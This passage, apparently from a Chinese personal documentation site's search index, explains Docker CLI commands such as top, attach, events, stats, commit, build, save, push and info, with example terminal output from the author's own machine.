\"/var/lib/docker/overlay2/c26d04f12ee93cf5d1856f63eb61dca2b866417b8d73cec1e9baa5860fa3cd61/diff:/var/lib/docker/overlay2/9245eeb0a8f0f9412452d02e23633ebb762288083c15392e57385332ee5793ef/diff:/var/lib/docker/overlay2/d448eb624cefd5b3af0fb2e5780df0538a39304bf30402568136f23c905d5f2c/diff:/var/lib/docker/overlay2/4d10354dd281b1040ed8b9f8924d978f8b6f3599a39e82ff87c0b08052cd2ade/diff:/var/lib/docker/overlay2/ebec34fd45fac8ec2858f01593d7d3117e21b6c97786bbea01742e705fd8a6b3/diff:/var/lib/docker/overlay2/edd8ed31051b48638c8b05dd8fdaecd65e245ef296b9ddbba98da08b53c35cd6/diff:/var/lib/docker/overlay2/5732de9fa78c685f662b1715a712c6651c54878ae67a955981ccdb1c3c4b5024/diff\" , \"MergedDir\" : \"/var/lib/docker/overlay2/e96aa157f1fe9bfad88b1597c7c821a18c8a5b507977fe0fbbc9fab22846af18/merged\" , \"UpperDir\" : \"/var/lib/docker/overlay2/e96aa157f1fe9bfad88b1597c7c821a18c8a5b507977fe0fbbc9fab22846af18/diff\" , \"WorkDir\" : \"/var/lib/docker/overlay2/e96aa157f1fe9bfad88b1597c7c821a18c8a5b507977fe0fbbc9fab22846af18/work\" } , \"Name\" : \"overlay2\" } , \"RootFS\" : { \"Type\" : \"layers\" , \"Layers\" : [ \"sha256:18f9b4e2e1bcd5abe381a557c44cba379884c88f6049564f58fd8c10ab5733df\" , \"sha256:d70ce8b0dad684a9e2294b64afa06b8848db950c109cde60cb543bf16d5093c9\" , \"sha256:ecd70829ec3d4a56a3eca79cec39d5ab3e4d404bf057ea74cf82682bb965e119\" , \"sha256:7381522c58b0db7134590fdcbc3b648865325f638427f69a474adc22e6b918af\" , \"sha256:1e96ffb4a81f9b0fbb625448b7d0b6b6a38b0b9eb891473320a90df91ded2acf\" , \"sha256:ec71859e4a965f98cb08cd85ef5ea52753fd26f811ba556264b2b08bb7b911b6\" , \"sha256:24b78eec42f88fb03c35a48f28301b0d2a26598c7795101184177ed00998880b\" , \"sha256:6bcbbdeefa0a25adf0cdab0004b772c21f16eb119965c8588ef100414d01b53f\" ] } , \"Metadata\" : { \"LastTagTime\" : \"0001-01-01T00:00:00Z\" } } ] yanque@yanquedembp mytest % top docker top :查看容器中运行的进程信息，支持 ps 命令参数 语法 docker top [OPTIONS] CONTAINER [ps OPTIONS] 注解 容器运行时不一定有/bin/bash终端来交互执行top命令，而且容器还不一定有top命令，可以使用docker top来实现查看 container (容器) 中正在运行的进程。 示例 查看容器 mykali 的进程信息。 yanque@yanquedembp mytest % docker top mykali\nUID PID PPID C STIME TTY TIME CMD\nroot 3177 3152 0 03 :19 ? 00 :00:00 /usr/bin/qemu-aarch64 /usr/bin/bash bash\nroot 3419 3152 0 06 :36 ? 00 :00:00 /usr/bin/qemu-aarch64 /bin/bash /bin/bash\nyanque@yanquedembp mytest % 查看所有运行容器的进程信息。 for i in ` docker ps | grep Up | awk '{print $1}' ` ; do echo \\ && docker top $i ; done attach docker attach :连接到正在运行中的容器。 语法 docker attach [OPTIONS] CONTAINER 要attach上去的容器必须正在运行，可以同时连接上同一个 container 来共享屏幕（与screen命令的attach类似）。 官方文档中说attach后可以通过CTRL-C来 detach ，但实际上经过我的测试，如果 container 当前在运行bash，CTRL-C自然是当前行的输入，没有退出；如果 container 当前正在前台运行进程，如输出nginx的 access .log日志，CTRL-C不仅会导致退出容器，而且还stop了。这不是我们想要的， detach 的意思按理应该是脱离容器终端，但容器依然运行。好在attach是可以带上--sig-proxy=false来确保CTRL-D或CTRL-C不会关闭容器。 示例 容器mynginx将访问日志指到标准输出，连接到容器查看访问信息。 runoob@runoob:~$ docker attach --sig-proxy = false mynginx 192 .168.239.1 - - [ 10 /Jul/2016:16:54:26 +0000 ] \"GET / HTTP/1.1\" 304 0 \"-\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36\" \"-\" events docker events : 从服务器获取实时事件 语法 docker events [OPTIONS] OPTIONS说明 -f ：根据条件过滤事件； --since ：从指定的时间戳后显示所有事件; --until ：流水时间显示到指定的时间为止； 示例 显示docker 镜像为 python 2022年10月1日后的相关事件。 yanque@yanquedembp mytest % docker events --since = \"1672204137\" -f \"image\" = \"python\" 2022 -12-28T15:30:25.569291322+08:00 image pull python:latest ( name = python ) 2022 -12-28T15:30:41.440253288+08:00 container create 7932605f6337cecda520ef7aab9702e0d18ce506e9a96967b5feaac7f3998fa9 ( image = python, name = objective_burnell ) 2022 -12-28T15:30:41.446677063+08:00 container attach 7932605f6337cecda520ef7aab9702e0d18ce506e9a96967b5feaac7f3998fa9 ( image = python, name = objective_burnell ) 2022 -12-28T15:30:42.106046916+08:00 container start 7932605f6337cecda520ef7aab9702e0d18ce506e9a96967b5feaac7f3998fa9 ( image = python, name = objective_burnell ) 2022 -12-28T15:30:42.216118892+08:00 container die 7932605f6337cecda520ef7aab9702e0d18ce506e9a96967b5feaac7f3998fa9 ( exitCode = 0 , image = python, name = objective_burnell ) 2022 -12-28T15:31:02.434099427+08:00 container create 9221c1215238177472921fb1f38a9cf0a3a2f3e4ea6e3f27b9e30a8620603799 ( image = python, name = peaceful_jones ) 2022 -12-28T15:31:02.437918597+08:00 container attach 9221c1215238177472921fb1f38a9cf0a3a2f3e4ea6e3f27b9e30a8620603799 ( image = python, name = peaceful_jones ) 2022 -12-28T15:31:02.709044368+08:00 container start 9221c1215238177472921fb1f38a9cf0a3a2f3e4ea6e3f27b9e30a8620603799 ( image = python, name = peaceful_jones ) 2022 -12-28T15:31:02.784000217+08:00 container die 9221c1215238177472921fb1f38a9cf0a3a2f3e4ea6e3f27b9e30a8620603799 ( exitCode = 0 , image = python, name = peaceful_jones ) 2022 -12-28T15:31:11.441315766+08:00 container create 491ca524a65358209d3db71648f07a0e319c827b1cfd6b672d66e338baa917dd ( image = python, name = nifty_hawking ) 2022 -12-28T15:31:11.446211552+08:00 container attach 491ca524a65358209d3db71648f07a0e319c827b1cfd6b672d66e338baa917dd ( image = python, name = nifty_hawking ) 2022 -12-28T15:31:11.725841917+08:00 container start 491ca524a65358209d3db71648f07a0e319c827b1cfd6b672d66e338baa917dd ( image = python, name = nifty_hawking ) 2022 -12-28T15:31:11.734199431+08:00 container resize 491ca524a65358209d3db71648f07a0e319c827b1cfd6b672d66e338baa917dd ( height = 58 , image = python, name = nifty_hawking, width = 166 ) 2022 -12-28T15:31:38.000185842+08:00 container die 491ca524a65358209d3db71648f07a0e319c827b1cfd6b672d66e338baa917dd ( exitCode = 0 , image = python, name = nifty_hawking ) 2022 -12-28T15:31:41.223429147+08:00 container create 83b54283c0f7640a2c8814341fb8d3f289d4bbec830b7995c12a7e141fb090f5 ( image = python, name = fervent_hofstadter ) 2022 -12-28T15:31:41.227702518+08:00 container attach 83b54283c0f7640a2c8814341fb8d3f289d4bbec830b7995c12a7e141fb090f5 ( image = python, name = fervent_hofstadter ) 2022 -12-28T15:31:41.447076652+08:00 container start 83b54283c0f7640a2c8814341fb8d3f289d4bbec830b7995c12a7e141fb090f5 ( image = python, name = fervent_hofstadter ) 2022 -12-28T15:31:41.455181214+08:00 container resize 83b54283c0f7640a2c8814341fb8d3f289d4bbec830b7995c12a7e141fb090f5 ( height = 58 , image = python, name = fervent_hofstadter, width = 166 ) 2022 -12-28T15:31:51.146816850+08:00 container die 83b54283c0f7640a2c8814341fb8d3f289d4bbec830b7995c12a7e141fb090f5 ( exitCode = 0 , image = python, name = fervent_hofstadter ) &#94;C% yanque@yanquedembp mytest % 如果指定的时间是到秒级的，需要将时间转成时间戳。如果时间为日期的话，可以直接使用，如--since=\"2022-10-01\"。 logs docker logs : 获取容器的日志 语法: docker logs [OPTIONS] CONTAINER OPTIONS说明 -f 跟踪日志输出 --since 显示某个开始时间的所有日志 -t 显示时间戳 --tail 仅列出最新N条容器日志 示例 跟踪查看容器 mykali 的日志输出 yanque@yanquedembp mytest % docker logs -f mykali\n┌── ( root㉿fa15654fc7d1 ) - [ / ] &#94;C% wait docker wait : 阻塞运行直到容器停止，然后打印出它的退出代码 语法 docker wait [OPTIONS] CONTAINER [CONTAINER...] 示例 docker wait CONTAINER export docker export : 将文件系统作为一个tar归档文件导出到STDOUT。 语法 docker export [OPTIONS] CONTAINER OPTIONS说明 -o :将输入内容写到文件。 示例 将容器 mykali 按日期保存为tar文件。 yanque@yanquedembp test % docker export -o mykali-`date +%Y%m%d`.tar mykali\nyanque@yanquedembp test % ls\n1.txt                   c++                     dd                      mykali-20221228.tar\nyanque@yanquedembp test % ls -lh mykali-20221228.tar\n-rw-------@ 1 yanque  staff   231M 12 28 16:20 mykali-20221228.tar\nyanque@yanquedembp test % port docker port 用于列出指定的容器的端口映射，或者查找将 PRIVATE_PORT NAT 到面向公众的端口 语法: docker port [OPTIONS] CONTAINER [PRIVATE_PORT[/PROTO]] 示例 查看容器 mykali 的端口映射情况 yanque@yanquedembp test % docker port mykali 5900 /tcp -> 0 .0.0.0:60000 5901 /tcp -> 0 .0.0.0:60001 5902 /tcp -> 0 .0.0.0:60002 stats docker stats : 显示容器资源的使用情况，包括：CPU、内存、网络 I/O 等 语法 docker stats [OPTIONS] [CONTAINER...] OPTIONS说明 --all , -a :显示所有的容器，包括未运行的。 --format (格式) :指定返回值的模板文件。 --no-stream :展示当前状态就直接退出了，不再实时更新。 --no-trunc :不截断输出。 示例 列出所有在运行的容器信息。 yanque@yanquedembp test % docker stats\nCONTAINER ID NAME CPU % MEM USAGE / LIMIT MEM % NET I/O BLOCK I/O PIDS\nfa15654fc7d1 mykali 0 .00% 23 .63MiB / 7 .675GiB 0 .30% 1 .51kB / 0B 6 .15MB / 4 .1kB 4 输出详情介绍 CONTAINER ID 与 NAME: 容器 ID 与名称。 CPU % 与 MEM %: 容器使用的 CPU 和内存的百分比。 MEM USAGE / LIMIT (限制) : 容器正在使用的总内存，以及允许使用的内存总量。 NET I/O: 容器通过其网络接口发送和接收的数据量。 BLOCK I/O: 容器从主机上的块设备读取和写入的数据量。 PIDs: 容器创建的进程或线程数。 根据容器等 ID 或名称现实信息, 支持多个: yanque@yanquedembp test % docker stats mykali\nCONTAINER ID NAME CPU % MEM USAGE / LIMIT MEM % NET I/O BLOCK I/O PIDS\nfa15654fc7d1 mykali 0 .00% 23 .63MiB / 7 .675GiB 0 .30% 1 .51kB / 0B 6 .15MB / 4 .1kB 4 以 JSON 格式输出： yanque@yanquedembp test % docker stats mykali --no-stream --format \"{{json .}}\" { \"BlockIO\" : \"6.15MB / 4.1kB\" , \"CPUPerc\" : \"0.00%\" , \"Container\" : \"mykali\" , \"ID\" : \"fa15654fc7d1\" , \"MemPerc\" : \"0.30%\" , \"MemUsage\" : \"23.63MiB / 7.675GiB\" , \"Name\" : \"mykali\" , \"NetIO\" : \"1.58kB / 0B\" , \"PIDs\" : \"4\" } yanque@yanquedembp test % 输出指定的信息： yanque@yanquedembp test % docker stats --no-stream --all --format \"table {{.Container}}\\t{{.CPUPerc}}\\t{{.MemUsage}}\" mykali\nCONTAINER CPU % MEM USAGE / LIMIT\nmykali 0 .00% 23 .63MiB / 7 .675GiB","tags":"容器与集群","url":"/yq-docs-Container-and-cluster-docker-docker_command-Container-operation.html","loc":"/yq-docs-Container-and-cluster-docker-docker_command-Container-operation.html"},{"title":"容器rootfs命令","text":"commit 从容器创建一个新的镜像 语法 docker commit [OPTIONS] CONTAINER [REPOSITORY[:TAG]] OPTIONS说明： -a :提交的镜像作者； -c :使用Dockerfile指令来创建镜像； -m :提交时的说明文字； -p :在commit时，将容器暂停。 示例 将容器 ea0a6afe23a3 保存为新的镜像, 设置仓库名为 kali , tag为 config_apt_list2 , 并添加提交人信息和说明信息。 ( dev_venv ) yanque@yanquedeMacBook-Pro project % docker commit -a 'yanque' -m 'kali image with config ustc apt list' ea0a6afe23a3 kali:config_apt_list2\nsha256:24b7cbbe11fb587bf850dad2f2dc1b46412a2c73c2b55a00716dabb1b7832204 ( dev_venv ) yanque@yanquedeMacBook-Pro project % ( dev_venv ) yanque@yanquedeMacBook-Pro project % docker images kali:config_apt_list2\nREPOSITORY TAG IMAGE ID CREATED SIZE\nkali config_apt_list2 24b7cbbe11fb 56 seconds ago 236MB cp docker cp :用于容器与主机之间的数据拷贝。 语法 docker cp [OPTIONS] CONTAINER:SRC_PATH DEST_PATH|- docker cp [OPTIONS] SRC_PATH|- CONTAINER:DEST_PATH OPTIONS说明： -L :保持源目标中的链接 示例 将主机 README.en.md 拷贝到容器 mykali 的 /root 目录下。 yanque@yanquedembp mytest % docker cp README.en.md mykali:/root\nyanque@yanquedembp mytest % ls -lh README.en.md\n-rw-r--r-- 1 yanque staff 816B 10 22 02 :12 README.en.md\nyanque@yanquedembp mytest %\nyanque@yanquedembp mytest % docker exec -it mykali /bin/bash\n┌── ( root㉿fa15654fc7d1 ) - [ / ] └─#\n┌── ( root㉿fa15654fc7d1 ) - [ ~ ] └─# cd ~ && ls -lh\ntotal 4 .0K\n-rw-r--r-- 1 501 dialout 816 Oct 21 18 :12 README.en.md\n\n┌── ( root㉿fa15654fc7d1 ) - [ ~ ] └─# diff docker diff : 检查容器里文件结构的更改 语法 docker diff [OPTIONS] CONTAINER 示例 查看容器 mykali 的文件结构更改。 yanque@yanquedembp ~ % docker diff mykali\nC /root\nC /root/.bash_history\nyanque@yanquedembp ~ %","tags":"容器与集群","url":"/yq-docs-Container-and-cluster-docker-docker_command-Container-rootfs-command.html","loc":"/yq-docs-Container-and-cluster-docker-docker_command-Container-rootfs-command.html"},{"title":"本地镜像管理","text":"images docker images : 列出本地镜像 语法: docker images [OPTIONS] [REPOSITORY[:TAG]] OPTIONS说明： -a 列出本地所有的镜像（含中间映像层，默认情况下，过滤掉中间映像层）； --digests 显示镜像的摘要信息； -f 显示满足条件的镜像； --format 指定返回值的模板文件； 比如只显示ID: docker images --format \"{{.ID}}\" 以表格形式美化显示(默认就是表格): docker images --format \"table {{.ID}}\\t{{.Repository}}\\t{{.Tag}}\" --no-trunc 显示完整的镜像信息； -q 只显示镜像ID。 示例 显示本地镜像列表 yanque@yanquedembp test % docker images\nREPOSITORY TAG IMAGE ID CREATED SIZE\nyanquer/kali config_apt_list2 24b7cbbe11fb 2 days ago 236MB\nwhyour/qinglong latest a5db91bf7c98 2 weeks ago 322MB\nkalilinux/kali-rolling latest c2fadbc65f8d 11 months ago 126MB\npython latest 26acbad26a2c 5 years ago 690MB\njava latest d23bdf5b1b1b 5 years ago 643MB 显示仓库为 yanquer/kali 镜像信息以及摘要信息 yanque@yanquedembp test % docker images --digests yanquer/kali\nREPOSITORY TAG DIGEST IMAGE ID CREATED SIZE\nyanquer/kali config_apt_list2 sha256:161c0ffd5197fa4a4a88d00e53ccf43500da3b075f1793d9a3722c6c0bdf15ff 24b7cbbe11fb 2 days ago 236MB rmi 删除image 语法 docker rmi [OPTIONS] IMAGE [IMAGE...] OPTIONS说明： -f :强制删除； --no-prune :不移除该镜像的过程镜像，默认移除； 示例 强制删除本地镜像 kali:config_apt_list1。 ( dev_venv ) yanque@yanquedeMacBook-Pro project % docker images\nREPOSITORY TAG IMAGE ID CREATED SIZE\nkali config_apt_list2 24b7cbbe11fb 3 minutes ago 236MB\nkali config_apt_list1 167a6460c75d 9 minutes ago 236MB\nkalilinux/kali-rolling latest ae8b160e1ecb 9 hours ago 140MB ( dev_venv ) yanque@yanquedeMacBook-Pro project % docker rmi kali:config_apt_list1\nUntagged: kali:config_apt_list1 ( dev_venv ) yanque@yanquedeMacBook-Pro project % ( dev_venv ) yanque@yanquedeMacBook-Pro project % docker images\nREPOSITORY TAG IMAGE ID CREATED SIZE\nkali config_apt_list2 24b7cbbe11fb 6 minutes ago 236MB\nkalilinux/kali-rolling latest ae8b160e1ecb 9 hours ago 140MB tag 标记本地镜像，将其归入某一仓库。 可用于更新名称然后删除旧的. 语法 docker tag [OPTIONS] IMAGE[:TAG] [REGISTRYHOST/][USERNAME/]NAME[:TAG] 示例 将镜像 kali:config_apt_list1 标记为 yanquer/kali:config_apt_list2 镜像。 ( dev_venv ) yanque@yanquedeMacBook-Pro project % docker images\nREPOSITORY TAG IMAGE ID CREATED SIZE\nkali config_apt_list2 24b7cbbe11fb 6 minutes ago 236MB\nkalilinux/kali-rolling latest ae8b160e1ecb 9 hours ago 140MB ( dev_venv ) yanque@yanquedeMacBook-Pro project % ( dev_venv ) yanque@yanquedeMacBook-Pro project % docker tag 24b7cbbe11fb yanquer/kali:config_apt_list2 ( dev_venv ) yanque@yanquedeMacBook-Pro project % ( dev_venv ) yanque@yanquedeMacBook-Pro project % docker images\nREPOSITORY TAG IMAGE ID CREATED SIZE\nkali config_apt_list2 24b7cbbe11fb 25 minutes ago 236MB\nyanquer/kali config_apt_list2 24b7cbbe11fb 25 minutes ago 236MB\nkalilinux/kali-rolling latest ae8b160e1ecb 10 hours ago 140MB ( dev_venv ) yanque@yanquedeMacBook-Pro project % build docker build 命令用于使用 Dockerfile 创建镜像。 语法: docker build [OPTIONS] PATH | URL | - OPTIONS说明： --build-arg 设置镜像创建时的变量 --build-arg=[] ； --cpu-shares 设置 cpu 使用权重； --cpu-period 限制 CPU CFS周期； --cpu-quota 限制 CPU CFS配额； --cpuset-cpus 指定使用的CPU id； --cpuset-mems 指定使用的内存 id； --disable-content-trust 忽略校验，默认开启； -f 指定要使用的Dockerfile路径； --force-rm 设置镜像过程中删除中间容器； --isolation 使用容器隔离技术； --label 设置镜像使用的元数据, --label=[] ； -m 设置内存最大值； --memory-swap 设置 Swap (交换) 的最大值为内存+ Swap (交换) ，\"-1\"表示不限 Swap (交换) ； --no-cache 创建镜像的过程不使用缓存； --pull 尝试去更新镜像的新版本； --quiet , -q 安静模式，成功后只输出镜像 ID； --rm 设置镜像成功后删除中间容器； --shm-size 设置/dev/shm的大小，默认值是64M； -u limit Ulimit配置。 --squash 将 Dockerfile 中所有的操作压缩为一层。 --tag , -t 镜像的名字及标签，通常 name:tag 或者 name 格式；可以在一次构建中为一个镜像设置多个标签。 --network 默认 default。在构建期间设置RUN指令的网络模式 示例 使用当前目录的 Dockerfile 创建镜像，标签为 runoob/ubuntu:v1。 docker build -t runoob/ubuntu:v1 . 使用URL github.com/creack/docker-firefox 的 Dockerfile 创建镜像。 docker build github.com/creack/docker-firefox 也可以通过 -f Dockerfile 文件的位置： $ docker build -f /path/to/a/Dockerfile . 在 Docker 守护进程执行 Dockerfile 中的指令前，首先会对 Dockerfile 进行语法检查，有语法错误时会返回： $ docker build -t test/myapp .\nSending build context to Docker daemon 2 .048 kB\nError response from daemon: Unknown instruction: RUNCMD history docker history : 查看指定镜像的创建历史 语法 docker history [OPTIONS] IMAGE OPTIONS说明： -H :以可读的格式打印镜像大小和日期，默认为true； --no-trunc :显示完整的提交记录； -q :仅列出提交记录ID。 示例 查看本地镜像 yanquer/kali:config_apt_list2 的创建历史 yanque@yanquedembp test % docker history yanquer/kali:config_apt_list2\nIMAGE CREATED CREATED BY SIZE COMMENT\n24b7cbbe11fb 2 days ago bash 526B kali image with config ustc apt list\n<missing> 2 days ago bash 96 .3MB\n<missing> 3 days ago /bin/sh -c #(nop) CMD [\"bash\"]                  140MB <missing> 3 days ago /bin/sh -c #(nop) ENV LANG=C.UTF-8              0B <missing> 3 days ago /bin/sh -c #(nop) ADD file:cc482abaa0a3211e9…   0B <missing> 3 days ago /bin/sh -c #(nop) LABEL org.opencontainers.i…   0B <missing> 3 days ago /bin/sh -c #(nop) ARG BUILD_DATE PROJECT_URL…   0B <missing> 3 days ago /bin/sh -c #(nop) ARG BUILD_DATE PROJECT_URL…   0B <missing> 3 days ago /bin/sh -c #(nop) ARG BUILD_DATE PROJECT_URL…   0B <missing> 3 days ago /bin/sh -c #(nop) ARG BUILD_DATE PROJECT_URL…   0B <missing> 3 days ago /bin/sh -c #(nop) ARG BUILD_DATE VERSION        0B <missing> 3 days ago /bin/sh -c #(nop) ARG BUILD_DATE                0B yanque@yanquedembp test % save docker save : 将指定镜像保存成 tar 归档文件 注解 docker export 也可以导出, 但是其针对的是容器, save针对的是镜像 语法 docker save [OPTIONS] IMAGE [IMAGE...] OPTIONS说明： -o :输出到的文件 示例 将镜像 yanquer/kali 生成归档文件. yanque@yanquedembp test % docker save -o mykali_image.tar yanquer/kali\nyanque@yanquedembp test % ls 1 .txt c++ dd mykali-20221228.tar mykali_image.tar\nyanque@yanquedembp test % ls -lh mykali_image.tar\n-rw-------@ 1 yanque staff 232M 12 28 16 :47 mykali_image.tar\nyanque@yanquedembp test % load docker load : 导入使用 docker save 命令导出的镜像 注解 docker export 导出归档的加载见 docker import . 语法 docker load [OPTIONS] OPTIONS说明： --input , -i : 指定导入的文件，代替 STDIN。 --quiet , -q : 精简输出信息。 示例 -i 的效果与 < 一样(懂shell重定向的都知道). 导入 yanquer/kali:config_apt_list2 yanque@yanquedembp test % docker load < mykali_image.tar\nLoaded image: yanquer/kali:config_apt_list2\nyanque@yanquedembp test %\nyanque@yanquedembp test % docker load --input mykali_image.tar\nLoaded image: yanquer/kali:config_apt_list2\nyanque@yanquedembp test % import docker import : 从归档文件中创建镜像 注解 除了导出 docker save 还可用于导入 docker export 导出的容器归档文件. 语法 docker import [OPTIONS] file|URL|- [REPOSITORY[:TAG]] OPTIONS说明： -c :应用docker 指令创建镜像； -m :提交时的说明文字； 示例 从 mykali-20221228.tar 归档文件创建 yanquer/mykali 镜像 yanque@yanquedembp test % docker import mykali-20221228.tar yanquer/mykali\nsha256:514ae6d5ab88157b978b729520e30c687a5b1b2e3ff2200de88c827bf5ec5ec8\nyanque@yanquedembp test %\nyanque@yanquedembp test % docker images\nREPOSITORY TAG IMAGE ID CREATED SIZE\nyanquer/mykali latest 514ae6d5ab88 6 seconds ago 235MB","tags":"容器与集群","url":"/yq-docs-Container-and-cluster-docker-docker_command-Local-mirror-management.html","loc":"/yq-docs-Container-and-cluster-docker-docker_command-Local-mirror-management.html"},{"title":"镜像仓库","text":"login/logout docker login  : 登陆到一个Docker镜像仓库，如果未指定镜像仓库地址，默认为官方仓库 Docker Hub docker logout : 登出一个Docker镜像仓库，如果未指定镜像仓库地址，默认为官方仓库 Docker Hub 语法 docker login [OPTIONS] [SERVER] docker logout [OPTIONS] [SERVER] OPTIONS说明： -u :登陆的用户名 -p :登陆的密码 示例 登陆到Docker Hub docker login -u 用户名 -p 密码 登出Docker Hub docker logout pull docker pull : 从镜像仓库中拉取或者更新指定镜像 语法 docker pull [OPTIONS] NAME[:TAG|@DIGEST] OPTIONS说明 -a 拉取所有 tagged 镜像 --disable-content-trust 忽略镜像的校验,默认开启 --platform= <plartform> 获取指定平台镜像, 默认拉自己平台的, 如 docker pull --platform=arm64 nginx:latest 示例 从Docker Hub下载java最新版镜像: docker pull java 从Docker Hub下载REPOSITORY为java的所有镜像: docker pull -a java 拉取arm64的nginx: docker pull --platform=arm64 nginx push 将本地的镜像上传到镜像仓库,要先登陆到镜像仓库. 语法 docker push [OPTIONS] NAME[:TAG] OPTIONS说明： --disable-content-trust :忽略镜像的校验,默认开启 示例 上传本地镜像 yanquer/kali:config_apt_list2 到镜像仓库中。 ( dev_venv ) yanque@yanquedeMacBook-Pro project % docker push yanquer/kali:config_apt_list2\nThe push refers to repository [ docker.io/yanquer/kali ] b94b4b255fde: Pushed\ncca6e5a3dfb7: Pushed\n385ea7e36a43: Pushed\nconfig_apt_list2: digest: sha256:161c0ffd5197fa4a4a88d00e53ccf43500da3b075f1793d9a3722c6c0bdf15ff size: 948 ( dev_venv ) yanque@yanquedeMacBook-Pro project % 注解 docker hub 可 类比与 github. 注意需要先使用 docker login 登陆, 且目标地址已有登陆仓库(没有需要先在仓库创建). 如要验证是否已登陆, 可使用 cat ~/.docker/config.json 查看内容是否有 auths . search docker search : 从Docker Hub查找镜像 语法 docker search [OPTIONS] TERM OPTIONS说明： --automated :只列出 automated build类型的镜像； --no-trunc :显示完整的镜像描述； -f <过滤条件>:列出收藏数不小于指定值的镜像。 示例 从 Docker Hub 查找所有镜像名包含 java ，并且收藏数大于 10 的镜像 yanque@yanquedembp mytest % docker search -f stars = 10 java\nNAME DESCRIPTION STARS OFFICIAL AUTOMATED\nnode Node.js is a JavaScript-based platform for s… 12222 [ OK ] tomcat Apache Tomcat is an open source implementati… 3458 [ OK ] java DEPRECATED ; use \"openjdk\" ( or other JDK impl… 1976 [ OK ] ghost Ghost is a free and open source blogging pla… 1582 [ OK ] couchdb CouchDB is a database that uses JSON for doc… 500 [ OK ] jetty Jetty provides a Web server and javax.servle… 387 [ OK ] amazoncorretto Corretto is a no-cost, production-ready dist… 267 [ OK ] groovy Apache Groovy is a multi-faceted language fo… 137 [ OK ] circleci/node Node.js is a JavaScript-based platform for s… 130 ibmjava Official IBM® SDK, Java™ Technology Edition … 107 [ OK ] tomee Apache TomEE is an all-Apache Java EE certif… 100 [ OK ] ibmcom/ibmjava IBM® SDK, Java™ Technology Edition Docker Im… 21 bitnami/java Bitnami Java Docker Image 13 [ OK ] 参数说明 NAME: 镜像仓库源的名称 DESCRIPTION (描述) : 镜像的描述 OFFICIAL: 是否 docker 官方发布 stars: 类似 Github 里面的 star，表示点赞、喜欢的意思。 AUTOMATED: 自动构建。","tags":"容器与集群","url":"/yq-docs-Container-and-cluster-docker-docker_command-Mirror-warehouse.html","loc":"/yq-docs-Container-and-cluster-docker-docker_command-Mirror-warehouse.html"},{"title":"info|version","text":"info 显示 Docker 系统信息，包括镜像和容器数 语法 docker info [OPTIONS] 示例 查看docker系统信息 yanque@yanquedembp ~ % docker info\nClient:\nContext: default\nDebug Mode: false Plugins:\nbuildx: Docker Buildx ( Docker Inc., v0.9.1 ) compose: Docker Compose ( Docker Inc., v2.13.0 ) dev: Docker Dev Environments ( Docker Inc., v0.0.5 ) extension: Manages Docker extensions ( Docker Inc., v0.2.16 ) sbom: View the packaged-based Software Bill Of Materials ( SBOM ) for an image ( Anchore Inc., 0 .6.0 ) scan: Docker Scan ( Docker Inc., v0.22.0 ) Server:\nContainers: 1 Running: 0 Paused: 0 Stopped: 1 Images: 3 Server Version: 20 .10.21\nStorage Driver: overlay2\nBacking Filesystem: extfs\nSupports d_type: true Native Overlay Diff: true userxattr: false Logging Driver: json-file\nCgroup Driver: cgroupfs\nCgroup Version: 2 Plugins:\nVolume: local Network: bridge host ipvlan macvlan null overlay\nLog: awslogs fluentd gcplogs gelf journald json-file local logentries splunk syslog\nSwarm: inactive\nRuntimes: runc io.containerd.runc.v2 io.containerd.runtime.v1.linux\nDefault Runtime: runc\nInit Binary: docker-init\ncontainerd version: 770bd0108c32f3fb5c73ae1264f7e503fe7b2661\nrunc version: v1.1.4-0-g5fd4c4d\ninit version: de40ad0\nSecurity Options:\nseccomp\nProfile: default\ncgroupns\nKernel Version: 5 .15.49-linuxkit\nOperating System: Docker Desktop\nOSType: linux\nArchitecture: x86_64\nCPUs: 4 Total Memory: 7 .675GiB\nName: docker-desktop\nID: OY2O:RZL6:WSMC:6CSU:F2F4:ETDE:JYMM:UYOJ:O3DU:VMV5:NPFN:PA3X\nDocker Root Dir: /var/lib/docker\nDebug Mode: false HTTP Proxy: http.docker.internal:3128\nHTTPS Proxy: http.docker.internal:3128\nNo Proxy: hubproxy.docker.internal\nRegistry: https://index.docker.io/v1/\nLabels:\nExperimental: false Insecure Registries:\nhubproxy.docker.internal:5000 127 .0.0.0/8\nRegistry Mirrors:\nhttps://0b27f0a81a00f3560fbdc00ddd2f99e0.mirror.swr.myhuaweicloud.com/\nhttps://ypzju6vq.mirror.aliyuncs.com/\nhttps://registry.docker-cn.com/\nhttp://hub-mirror.c.163.com/\nhttps://docker.mirrors.ustc.edu.cn/\nLive Restore Enabled: false yanque@yanquedembp ~ % version 显示 Docker 版本信息。 语法 docker version [OPTIONS] OPTIONS说明： -f :指定返回值的模板文件。 示例 显示 Docker 版本信息 yanque@yanquedembp ~ % docker version\nClient:\nCloud integration: v1.0.29\nVersion: 20 .10.21\nAPI version: 1 .41\nGo version: go1.18.7\nGit commit: baeda1f\nBuilt: Tue Oct 25 18 :01:18 2022 OS/Arch: darwin/amd64\nContext: default\nExperimental: true Server: Docker Desktop 4 .15.0 ( 93002 ) Engine:\nVersion: 20 .10.21\nAPI version: 1 .41 ( minimum version 1 .12 ) Go version: go1.18.7\nGit commit: 3056208 Built: Tue Oct 25 18 :00:19 2022 OS/Arch: linux/amd64\nExperimental: false containerd:\nVersion: 1 .6.10\nGitCommit: 770bd0108c32f3fb5c73ae1264f7e503fe7b2661\nrunc:\nVersion: 1 .1.4\nGitCommit: v1.1.4-0-g5fd4c4d\ndocker-init:\nVersion: 0 .19.0\nGitCommit: de40ad0\nyanque@yanquedembp ~ %","tags":"容器与集群","url":"/yq-docs-Container-and-cluster-docker-docker_command-info_version.html","loc":"/yq-docs-Container-and-cluster-docker-docker_command-info_version.html"},{"title":"mysql","text":"hub地址:: docker-mysql 一些环境变量: MYSQL_ROOT_PASSWORD MYSQL_DATABASE MYSQL_USER, MYSQL_PASSWORD MYSQL_ALLOW_EMPTY_PASSWORD MYSQL_RANDOM_ROOT_PASSWORD MYSQL_ONETIME_PASSWORD MYSQL_INITDB_SKIP_TZINFO 运行: docker run --name mymysql -e MYSQL_ROOT_PASSWORD=root -e MYSQL_USER=yanque_wiki -e MYSQL_PASSWORD=yanque_wiki -d mysql:tag","tags":"容器与集群","url":"/yq-docs-Container-and-cluster-docker-docker_store-mysql.html","loc":"/yq-docs-Container-and-cluster-docker-docker_store-mysql.html"},{"title":"dockerfile编写","text":"定制docker镜像的方式有两种 手动修改容器内容，导出新的镜像;\n相关指令: docker commit 将容器提交为镜像 